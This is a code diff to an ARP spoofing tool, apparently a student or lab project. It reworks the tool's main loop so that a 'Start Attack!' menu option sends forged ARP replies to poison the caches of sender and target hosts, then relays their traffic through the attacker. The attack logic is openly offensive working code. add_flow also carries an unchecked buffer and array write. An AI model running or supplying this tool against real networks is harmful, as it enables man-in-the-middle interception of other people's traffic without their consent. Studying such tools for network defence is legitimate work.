@@ -5,26 +5,6 @@
 #include "pthread.h"
 #include <signal.h>
 
-void sigint_handler(int signo)
-{
-	int choice;
-	printf("You want to quit?\n");
-	while (1)
-	{
-		printf("1. Quit\n");
-		printf("2. Keep Attack\n");
-		scanf("%d", &choice);
-
-		if (choice == 1)
-		{
-			exit(0);
-		}
-		else if (choice == 2)
-		{
-			return;
-		}
-	}
-}
 void usage()
 {
 	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
@@ -69,29 +49,60 @@ int main(int argc, char *argv[])
 	{
 		argv_ip(argv[2 * i + 2], targets[i].sender_ip);
 		argv_ip(argv[2 * i + 3], targets[i].target_ip);
-		request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, targets[i].target_ip, htons(ArpHdr::Request));
-		reply(dev, pcap, targets[i].target_mac, targets[i].target_ip);
-		request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, targets[i].sender_ip, htons(ArpHdr::Request));
-		reply(dev, pcap, targets[i].sender_mac, targets[i].sender_ip);
 		printf("+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+\n");
 		printf("flow %d info\n", i);
-		printf("attacker ip addr : ");
-		print_ip(attacker_ip);
 		printf("sender_%d ip addr : ", i);
 		print_ip(targets[i].sender_ip);
 		printf("target_%d ip addr : ", i);
 		print_ip(targets[i].target_ip);
-		printf("attacker mac addr : ");
-		print_mac(attacker_mac);
-		printf("sender_%d mac addr : ", i);
-		print_mac(targets[i].sender_mac);
-		printf("target_%d mac addr : ", i);
-		print_mac(targets[i].target_mac);
 		printf("+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+\n\n");
-		request(dev, pcap, targets[i].sender_mac, attacker_mac, attacker_mac, targets[i].target_ip, targets[i].sender_mac, targets[i].sender_ip, htons(ArpHdr::Reply));
-		request(dev, pcap, targets[i].target_mac, attacker_mac, attacker_mac, targets[i].sender_ip, targets[i].target_mac, targets[i].target_ip, htons(ArpHdr::Reply));
 	}
-	relay(dev, pcap, attacker_mac, targets, count);
+
+	int todo_choice;
+	printf("What do to?\n");
+	while (1)
+	{
+		printf("1. Start Attack!\n");
+		printf("2. Add flow info\n");
+		printf("3. Exit");
+		scanf("%d", &todo_choice);
+		if (todo_choice == 1)
+		{
+			for (int i = 0; i < count; i++)
+			{
+				request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, targets[i].target_ip, htons(ArpHdr::Request));
+				reply(dev, pcap, targets[i].target_mac, targets[i].target_ip);
+				request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, targets[i].sender_ip, htons(ArpHdr::Request));
+				reply(dev, pcap, targets[i].sender_mac, targets[i].sender_ip);
+				request(dev, pcap, targets[i].sender_mac, attacker_mac, attacker_mac, targets[i].target_ip, targets[i].sender_mac, targets[i].sender_ip, htons(ArpHdr::Reply));
+				request(dev, pcap, targets[i].target_mac, attacker_mac, attacker_mac, targets[i].sender_ip, targets[i].target_mac, targets[i].target_ip, htons(ArpHdr::Reply));
+			}
+			relay(dev, pcap, attacker_mac, targets, count);
+		}
+		else if (todo_choice == 2)
+		{
+			add_flow(targets, &count);
+		}
+		else if (todo_choice == 3)
+		{
+			pcap_close(pcap);
+			exit(0);
+		}
+	}
 	pcap_close(pcap);
 	return 0;
+}
+
+void add_flow(list *targets, int *count)
+{
+	char ip[30];
+	char mac[30];
+	printf("Enter sender ip address: ");
+	scanf("%s", ip);
+	argv_ip(ip, targets[*count].sender_ip);
+	printf("Enter target ip address: ");
+	scanf("%s", ip);
+	argv_ip(ip, targets[*count].target_ip);
+
+	(*count)++;
 }
